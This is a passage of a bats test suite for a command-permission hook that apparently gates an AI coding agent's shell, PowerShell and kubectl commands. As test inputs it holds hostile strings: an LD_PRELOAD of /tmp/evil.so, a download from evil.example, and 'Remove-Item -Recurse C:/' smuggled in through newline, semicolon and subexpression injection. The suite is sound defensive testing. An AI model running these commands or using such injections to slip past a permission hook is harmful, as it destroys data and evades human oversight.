@test "redirect: 'mv' in a commit message routes to git-commit, not git-mv" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths
EOF
)"
    run_hook 'git commit -m "remove old mv helper"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
    [[ "$output" != *"list both paths"* ]]
}

# ─── Tier 3 — adapter-aware test/lint redirects ─────────────────────

# When `[adapter-redirect-commands]` matches (pytest, ruff, etc.) and
# $cwd resolves to a component with a wired adapter, the hook denies
# with a bypass-pointer. When the adapter is unwired (file absent or
# missing the commands.<verb> entry), the hook emits a stderr nudge
# and falls through to the normal allow/ask evaluation. Outside a
# component dir, the rule doesn't fire at all.

@test "adapter-redirect: raw pytest in a component WITH commands.test denies" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*            | test
pytest-mod  | python* -m pytest* | test
ruff        | ruff*              | lint
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
  lint: "python3 -m ruff check src/"
YAML
)"
    run_hook 'pytest tests/test_foo.py' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test wiredcomp"* ]]
    [[ "$output" == *"ws hook-bypass pytest"* ]]
}

@test "adapter-redirect: raw python -m pytest matches the pytest-mod pattern" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*            | test
pytest-mod  | python* -m pytest* | test
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
YAML
)"
    run_hook 'python3 -m pytest tests/' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws test wiredcomp"* ]]
}

@test "adapter-redirect: raw ruff in a component WITH commands.lint denies" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
ruff | ruff* | lint
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  lint: "python3 -m ruff check src/"
YAML
)"
    run_hook 'ruff check src/' "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws lint wiredcomp"* ]]
}

@test "adapter-redirect: raw pytest in a component WITHOUT an adapter file emits nudge and falls through" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    # Empty adapter content = no adapter file at all.
    seed_adapter_fixture "barecomp" ""
    run_hook 'pytest tests/' "$WORK/components/barecomp"
    [ "$status" -eq 0 ]
    # Falls through — no deny / no allow emitted by Tier 3.
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    # Nudge on stderr — bats `run` merges fd1+fd2, so the message is
    # visible in $output even though it's printed to stderr.
    [[ "$output" == *"No \`ws test\` adapter for barecomp"* ]]
}

@test "adapter-redirect: adapter present but missing commands.<verb> still emits nudge" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
ruff   | ruff*   | lint
EOF
)"
    # Adapter file exists but only has commands.lint (test is missing).
    seed_adapter_fixture "lintonly" "$(cat <<'YAML'
commands:
  lint: "ruff check ."
YAML
)"
    run_hook 'pytest tests/' "$WORK/components/lintonly"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"No \`ws test\` adapter for lintonly"* ]]
}

@test "adapter-redirect: pytest outside any component dir doesn't fire the rule" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    # cwd = $WORK (project root, not inside components/).
    run_hook "pytest tests/" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"No \`ws test\` adapter"* ]]
}

@test "adapter-redirect: pytest at the bare components/ root falls through (no blank-component nudge)" {
    # Pin the _ar_resolve_component edge case: the pattern
    # `"$root/components/"*` also matches `$root/components/` itself
    # (empty tail). Without the empty-segment guard the resolver
    # would emit a nudge for a blank component name and try to look
    # up `adapters/.yaml`. Guard ensures the rule only fires under
    # an actual `components/<comp>/` path.
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    mkdir -p "$WORK/components"
    run_hook "pytest tests/" "$WORK/components"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    # No blank-component nudge: a regression that surfaces `No ws
    # test adapter for ...` (with empty or whitespace-only name)
    # would fail here.
    [[ "$output" != *"No \`ws test\` adapter for "* ]]
}

@test "adapter-redirect: overlapping unwired patterns emit only one nudge" {
    # Two entries whose globs both match `pytest tests/` (same verb,
    # same component). Without the break-on-first-match guard, the
    # unwired branch would emit two nudges and two audit entries for
    # a single invocation. Pin the one-nudge contract here.
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*  | test
pytest-narrow | pytest * | test
EOF
)"
    seed_adapter_fixture "barecomp" ""
    run_hook "pytest tests/" "$WORK/components/barecomp"
    [ "$status" -eq 0 ]
    # Count how many times the nudge phrase appears. Should be 1.
    local nudge_count
    nudge_count="$(printf '%s\n' "$output" | grep -c "No \`ws test\` adapter for barecomp" || true)"
    [ "$nudge_count" -eq 1 ] || { echo "expected 1 nudge, got $nudge_count"; return 1; }
}

@test "adapter-redirect: bypass marker turns wired-deny into allow" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest | pytest* | test
EOF
)"
    seed_adapter_fixture "wiredcomp" "$(cat <<'YAML'
commands:
  test: "python3 -m pytest tests/"
YAML
)"
    write_bypass_marker "pytest" "session-xyz" "running a single test directly"
    run_hook_with_session "pytest tests/test_one.py::test_x" "session-xyz" "$WORK/components/wiredcomp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── scoped-redirect-commands: parse-safety guard ───────────────────

@test "scoped-redirect: section parses without aborting the file (no scope → passthrough)" {
    write_project_hook_rules "$(cat <<'EOF'
[scoped-redirect-commands]
k8s | kubectl* | GDD_K8S_CONTEXT | Use `ws k8s <args>`.
EOF
)"
    run_hook 'kubectl get pods'
    [ "$status" -eq 0 ]
    # No session/scope present → no redirect, and the file must NOT be skipped (no parse warning behavior).
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "redirect: command outside [redirect-commands] passes through Tier 2" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_project_settings "Bash(ls *)"
    run_hook "ls -la"
    [ "$status" -eq 0 ]
    # Settings.json allow at Tier 5 should still match
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Tier 2 redirect — bypass marker ────────────────────────────────

@test "bypass: marker with matching session_id turns deny into allow" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend last commit"
    run_hook_with_session 'git commit --amend -m "fix"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason="amend last commit"' "$HOME/.claude/hook-audit.log"
}

@test "bypass: marker with mismatched session_id still denies" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-stale" "old session"
    run_hook_with_session 'git commit -m "fix"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
}

@test "bypass: marker with empty reason still allows, audit reason is empty" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" ""
    run_hook_with_session 'git commit -m "x"' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason=""' "$HOME/.claude/hook-audit.log"
}

@test "bypass: git-commit marker does NOT bypass gh-pr-create deny (slug isolation)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session "gh pr create --title x --body y" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws cr"* ]]
}

@test "bypass: marker does NOT override Tier 1 composition deny" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session 'git commit -m x && git push' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "bypass: marker does NOT override Tier 4 ask-list" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
[ask-commands]
rm -rf*
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "amend"
    run_hook_with_session "rm -rf .tmp/anything" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "bypass: empty session_id in payload means no marker can match" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "" "no-id"
    run_hook_with_session "git commit -m x" ""
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    # Security invariant: empty must not match empty. Confirm the deny is
    # the -n guard rejecting the marker, NOT a bypass that silently fired.
    ! grep -q 'BYPASS-ALLOW' "$HOME/.claude/hook-audit.log"
}

@test "bypass: ws hook-bypass <slug> does not match any redirect pattern (pattern-collision invariant)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
[ask-commands]
ws hook-bypass [a-z]*
EOF
)"
    # Each known slug invocation should hit Tier 4 ask, NOT Tier 2 deny.
    for slug in git-commit git-push gh-pr-create; do
        echo "# testing slug: $slug"   # surfaces which iteration failed
        run_hook "ws hook-bypass $slug"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    done
}

@test "bypass: marker is found when cwd is a subdirectory of the project root" {
    # The marker lives at <project-root>/.tmp/hook-bypass/ (where
    # ws hook-bypass writes it). When the agent's cwd is a subdir, the
    # hook must still resolve the marker via the hook-rules root, not a
    # cwd-anchored path. Regression guard for the cwd-anchored lookup bug.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    write_bypass_marker "git-commit" "session-abc" "from subdir"
    mkdir -p "$WORK/components/some-comp"
    run_hook_with_session 'git commit -m x' "session-abc" "$WORK/components/some-comp"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason="from subdir"' "$HOME/.claude/hook-audit.log"
}

@test "bypass: malformed marker missing session_id denies without aborting the hook" {
    # A corrupted / hand-edited marker missing the session_id line must
    # NOT abort the hook (grep-fail under set -euo pipefail). It should
    # treat the marker as stale and deny normally.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    mkdir -p "$WORK/.tmp/hook-bypass"
    printf 'slug: git-commit\nreason: hand-edited\n' > "$WORK/.tmp/hook-bypass/git-commit.bypass"
    run_hook_with_session 'git commit -m x' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "bypass: malformed marker missing reason line still allows on session match" {
    # Missing reason line must not abort the hook either; with a matching
    # session_id the bypass still applies, just with an empty reason.
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    mkdir -p "$WORK/.tmp/hook-bypass"
    printf 'session_id: session-abc\nslug: git-commit\n' > "$WORK/.tmp/hook-bypass/git-commit.bypass"
    run_hook_with_session 'git commit -m x' "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[git-commit\] reason=""' "$HOME/.claude/hook-audit.log"
}

# ─── ws commit allowlist + bounded attribution prepend ──────────────

# These tests assert the SHIPPED config (real .claude/settings.json +
# .claude/hooks/hook-rules), so each seeds the synthetic project with the
# committed files — the hook can't walk up to the repo from the tmp $WORK.

@test "allow: bare 'ws commit' is allowlisted" {
    seed_real_project_config
    run_hook "ws commit yggdrasil .commits/x.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# Sub-agents attribute commits via `ws commit --co-author-file <name>`, NOT
# an env prefix. The flag carries only a bare file name (no `<email>` angle
# brackets, no env assignment), so it never trips Tier 1 and matches the
# bare `Bash(ws commit:*)` allow directly — no special hook handling needed.
@test "allow: ws commit --co-author-file is allowlisted (matches ws commit:*)" {
    seed_real_project_config
    run_hook 'ws commit --co-author-file sub-agent-xyz yggdrasil .commits/x.md'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ws test / ws lint allowlisted under the realm trust model (design § Adapter
# trust). They run adapter-defined commands; trust is established at realm
# scan/activation (orientation risk-scan) + surfaced by `ws orient`, NOT by
# withholding the allowlist.
@test "allow: ws test is allowlisted" {
    seed_real_project_config
    run_hook "ws test knarr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow: ws lint is allowlisted" {
    seed_real_project_config
    run_hook "ws lint knarr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ws orient / ws audit-permissions are MUST-run session-start commands (the
# orientation contract). Both are read-only and were missing from the shipped
# allowlist, so every fresh session prompted on them. Regression guards.
@test "allow: ws orient is allowlisted" {
    seed_real_project_config
    run_hook "ws orient"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "allow: bash scripts/ws orient is allowlisted" {
    seed_real_project_config
    run_hook "bash scripts/ws orient"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "allow: ws audit-permissions is allowlisted" {
    seed_real_project_config
    run_hook "ws audit-permissions"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# SECURITY: a general env-prefix strip must NOT exist — an arbitrary env
# assignment on an allowlisted command must not silently auto-approve.
@test "security: LD_PRELOAD prefix on an allowlisted command does NOT auto-allow" {
    seed_real_project_config
    run_hook 'LD_PRELOAD=/tmp/evil.so ws status'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# SECURITY: an arbitrary env prefix must not auto-allow a command. There is
# no env-prefix strip anymore (sub-agents use `--co-author-file`), so a
# prefixed command keeps its prefix in the match string and cannot match the
# bare allow globs. A bare `git commit` still denies via the redirect tier
# (covered above); here we only assert the prefixed form never auto-allows.
@test "security: an env prefix on a command does NOT auto-allow" {
    seed_real_project_config
    run_hook 'GDD_CO_AUTHOR="x" git commit -m y'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# ─── PowerShell branch: deny-by-default + carve-out + bypass ────────
#
# CLAUDE_PROJECT_DIR is pinned to $WORK in the bypass tests so the
# marker lookup resolves inside the sandbox regardless of what the
# ambient environment carries.

@test "powershell: arbitrary command denies with constructive message" {
    run_hook_ps "Get-ChildItem C:/Users -Recurse"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"blocked by default"* ]]
    [[ "$output" == *"ws hook-bypass powershell"* ]]
}

@test "powershell: bare ./test.ps1 allows (carve-out)" {
    run_hook_ps "./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: ./test.ps1 with suite arg allows" {
    run_hook_ps "./test.ps1 openbao"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: Set-Location prefix + ./test.ps1 allows" {
    run_hook_ps "Set-Location D:/Dev/GitWS/yggdrasil/components/nidavellir; ./test.ps1 openbao"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: cd prefix + backslash invocation allows" {
    run_hook_ps "cd D:/Dev/GitWS/yggdrasil/components/mimir; .\\test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: trailing command after test.ps1 denies" {
    run_hook_ps "./test.ps1 openbao; Remove-Item -Recurse C:/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: subexpression in test.ps1 args denies" {
    run_hook_ps "./test.ps1 \$(Remove-Item -Recurse C:/)"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: two chained Set-Location segments deny (only one prefix allowed)" {
    run_hook_ps "Set-Location a; Set-Location b; ./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: test.ps1 elsewhere in command does not sneak through" {
    run_hook_ps "Invoke-WebRequest evil.example --OutFile ./test.ps1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: newline-injected command after test.ps1 denies (PS statement separator)" {
    # Newline is a full statement separator in PowerShell, and both
    # [[:space:]] and a negated bracket class match it — this is the
    # exact bypass CodeRabbit repro'd in PR #95 review.
    run_hook_ps $'./test.ps1 openbao\nRemove-Item -Recurse C:/'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: CR-injected command after test.ps1 denies" {
    run_hook_ps $'./test.ps1 openbao\rRemove-Item -Recurse C:/'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "powershell: newline before Set-Location prefix also denies" {
    run_hook_ps $'Remove-Item -Recurse C:/\nSet-Location comp; ./test.ps1'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: bypass marker with matching session allows + audits" {
    write_bypass_marker "powershell" "session-abc" "hook debugging"
    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-ALLOW \[powershell\] reason="hook debugging"' "$HOME/.claude/hook-audit.log"
}

@test "powershell: bypass marker with stale session still denies" {
    write_bypass_marker "powershell" "session-stale" "old"
    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "powershell: WS_HOOK_DISABLE=1 passthrough applies to PowerShell too" {
    WS_HOOK_DISABLE=1 run_hook_ps "Get-ChildItem"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# ─── Tier 2b: scoped-redirect-commands ──────────────────────────────
#
# A [scoped-redirect-commands] entry gates on a session env key.  When
# the key is present in the session file, raw kubectl is redirected to
# `ws k8s`; in-scope `ws k8s` reads auto-approve; out-of-scope writes
# deny; and a script containing raw kubectl is blocked.

seed_k8s_scope() {  # $1=session_id, $2=context, $3=namespaces
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    cat > "$WORK/.tmp/gdd-agent-sessions/$1.env" <<EOF
GDD_K8S_CONTEXT=$2
GDD_K8S_NAMESPACES=$3
EOF
}

@test "scoped-redirect: active non-k8s entry does not abort when k8s floor is disabled" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\ncustom | customctl* | CUSTOM_SCOPE | Use custom wrapper\n')"
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    printf 'CUSTOM_SCOPE=armed\n' > "$WORK/.tmp/gdd-agent-sessions/scoped-custom.env"
    run_hook_with_session 'customctl mutate' "scoped-custom"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use custom wrapper"* ]]
}

@test "scoped-redirect: raw kubectl redirects to ws k8s when scope active" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws k8s"* ]]
}
@test "scoped-redirect: raw kubectl passes through when NO scope" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'kubectl get pods' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}
@test "k8s safety floor: unscoped raw write force-asks before a blanket allow" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    write_project_settings 'Bash(kubectl:*)'
    run_hook_with_session 'kubectl --context shared apply -k overlays/plain' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"No Kubernetes guard scope is active"* ]]
}
@test "k8s safety floor: unscoped ws k8s write force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'ws k8s delete pod foo -n prod' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: unscoped script containing kubectl force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/danger.sh"
    run_hook_with_session "bash $WORK/danger.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: env-wrapped kubectl run force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'env KUBECONFIG=/tmp/test kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: absolute kubectl path force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session '/usr/bin/kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: command wrapper around kubectl run force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'command /usr/bin/kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: bash -c containing kubectl force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session "bash -c 'kubectl run script-test --image=pause -n gdd-practice'" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: matching bypass permits an unscoped write" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    write_bypass_marker "k8s" "no-scope-sess" "disposable cluster automation"
    run_hook_with_session 'kubectl apply -k overlays/plain' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}
@test "k8s safety floor: matching bypass permits an unscoped kubectl script" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/danger.sh"
    write_bypass_marker "k8s" "no-scope-sess" "disposable cluster automation"
    run_hook_with_session "bash $WORK/danger.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}
@test "scoped-redirect: raw in-scope kubectl READ auto-approves (agent path)" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl get pods -n kube-system' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: raw in-scope kubectl WRITE still redirects to ws k8s (context injection)" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n alice-sandbox' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws k8s"* ]]
}
@test "scoped-redirect: raw out-of-scope kubectl write denies with the guard message" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"REJECTED by the k8s scope guard"* ]]
}
@test "scoped-redirect: in-scope ws k8s read auto-approves" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s get pods -n kube-system' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: out-of-scope ws k8s write denies" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: cluster-scoped ws k8s write deny renders class-appropriate remediation" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s delete namespace prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"REJECTED by the k8s scope guard"* ]]
    # The raw verdict class tag must not leak into the user-facing message.
    [[ "$output" != *"unbounded:"* ]]
}
@test "scoped-redirect: temp script containing kubectl is denied under scope" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    printf '#!/bin/bash\nkubectl delete ns prod\n' > "$WORK/danger.sh"
    run_hook_with_session "bash $WORK/danger.sh" "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: relative executable kubectl-run script resolves from payload cwd" {
